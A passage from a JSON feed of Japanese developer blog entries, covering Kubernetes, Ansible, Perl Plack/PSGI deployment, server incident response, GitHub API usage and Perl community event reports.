でAPIを作成してみようと考えています。","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Istioが作るサービスメッシュ~サンプルアプリのデプロイ~","link":"https://qiita.com/tozastation/items/1f3c3f213b42e1689406","contentSnippet":"サンプルアプリ題材: BookInfo アプリケーション※ 事前にIstioをKubernetesにデプロイしておいてください．構成サンプルアプリのデプロイistio-1.0.6 directorykubectl apply -f samples/boo...","isoDate":"2019-03-14T05:18:21.000Z","dateMiliSeconds":1552540701000,"authorName":"tozastation","authorId":"tozastation"},{"title":"2018年振り返りと、2019年の目標","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controllerを実際に実装したものは数多作られており、環境によって、大なり小なり記述方...","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"日本語でvimのfを使う","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカーソルから右側の方向の３番目に近い「a」の位置に移動することができます。...","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプションがあり，指定した形式の日時がログのある行に含まれていれば，続く行も同じ...","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。1今日のような一日は、自然とQiitaにたどり着き、PVが増えるのではないかと勝手に邪推する筆者です。さて、話は閑話休題。ローカル環...","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大クラウド時代を嚆矢として、様々なレイヤーでの自動化、Kubenetesに...","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"[Laravel] バリデーションデータに前処理したい","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには090で始まる形式の携帯電話番号を入力してもらっているが，システム的に...","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクトリを切り出すリポジトリ repo1 のサブディレクトリ su...","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"障碍対応と私","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar -q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm#7に参加しました。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-12-12-chiba.pm7","link":"https://speakerdeck.com/masasuzu/2015-12-12-chiba-dot-pm7","contentSnippet":"Chiba.pm#7 2015年をふりかえる","isoDate":"2015-12-12T05:00:00.000Z","dateMiliSeconds":1449896400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl \'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-09-17_gotanda.pm6","link":"https://speakerdeck.com/masasuzu/2015-09-17-gotanda-dot-pm6","contentSnippet":"Gotanda.pm#6 LT\\r監視の7原則という半分ネタなトーク","isoDate":"2015-09-17T04:00:00.000Z","dateMiliSeconds":1442462400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-07-10-kichijoji.pm4_yurui_template","link":"https://speakerdeck.com/masasuzu/2015-07-10-kichijoji-dot-pm4-yurui-template","contentSnippet":"テンプレートとPerlに関するゆるい話\\r\\r吉祥寺.pm #4","isoDate":"2015-07-10T04:00:00.000Z","dateMiliSeconds":1436500800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第二 四半期をふりかえる","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 